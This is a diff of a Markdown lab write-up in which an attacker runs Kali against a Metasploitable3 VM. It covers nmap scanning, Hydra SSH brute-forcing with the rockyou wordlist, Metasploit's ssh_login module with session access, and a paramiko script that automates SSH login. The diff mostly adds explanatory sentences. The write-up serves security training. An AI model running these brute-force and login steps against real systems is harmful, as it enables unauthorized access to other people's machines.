@@ -6,13 +6,13 @@
 
 ## Environment Setup
 
-- **Attacker Machine:** Kali Linux
-  - IP Address: `192.168.8.164/24`
+- **Attacker Machine:** Kali Linux  
+  IP Address: `192.168.8.164/24`
   
   <img src="task1.1_screenshots/AttackerIP.png" width="500"/>
 
-- **Victim Machine:** Metasploitable3 Ubuntu 14.04
-  - IP Address: `192.168.8.165/24`
+- **Victim Machine:** Metasploitable3 Ubuntu 14.04  
+  IP Address: `192.168.8.165/24`
   
   <img src="task1.1_screenshots/victimIP.png" width="500"/>
 
@@ -22,7 +22,7 @@
 
 ### 1. **Network Connectivity Test**
 
-Verified communication:
+Check basic connectivity between attacker and victim.
 
 ```bash
 ping 192.168.8.165
@@ -34,7 +34,7 @@ ping 192.168.8.165
 
 ### 2. **Scanning the Victim with Nmap**
 
-Discovering services:
+Enumerate open ports and services running on the victim.
 
 ```bash
 nmap -sV 192.168.8.165
@@ -46,6 +46,8 @@ nmap -sV 192.168.8.165
 
 ### 3. **Brute-Forcing SSH with Hydra**
 
+Attempt to discover valid SSH login credentials using a wordlist.
+
 ```bash
 hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
 ```
@@ -56,6 +58,8 @@ hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
 
 ### 4. **Launching Metasploit Framework**
 
+Start Metasploit to prepare for the exploitation phase.
+
 ```bash
 sudo msfconsole
 ```
@@ -65,6 +69,8 @@ sudo msfconsole
 ---
 
 ### 5. **Exploiting SSH Using Metasploit**
+
+Use Metasploit to login to the SSH service with the discovered credentials.
 
 ```bash
 use auxiliary/scanner/ssh/ssh_login
@@ -79,6 +85,8 @@ run
 
 ### 6. **Opening SSH Session**
 
+Access the target machine shell through a created session.
+
 ```bash
 sessions
 sessions -i 1
@@ -87,6 +95,8 @@ sessions -i 1
 ---
 
 ### 7. **Verifying Shell Access**
+
+Confirm access and privilege level on the victim machine.
 
 ```bash
 whoami
@@ -97,7 +107,9 @@ uname -a
 
 ## Task 1.2: Automated Exploitation Using Python
 
-### 1. Installing Python SSH Library
+### 1. **Installing Python SSH Library**
+
+Install necessary Python libraries to interact with SSH.
 
 ```bash
 sudo apt update
@@ -107,7 +119,9 @@ pip3 install paramiko
 
 ---
 
-### 2. Developing the Script
+### 2. **Developing the Script**
+
+Create a Python script to automate SSH login and command execution.
 
 ```python
 import paramiko
@@ -137,7 +151,9 @@ ssh_connect(target_ip, port, username, password)
 
 ---
 
-### 3. Executing the Script
+### 3. **Executing the Script**
+
+Run the script to verify automated SSH exploitation.
 
 ```bash
 python3 ssh_exploit.py
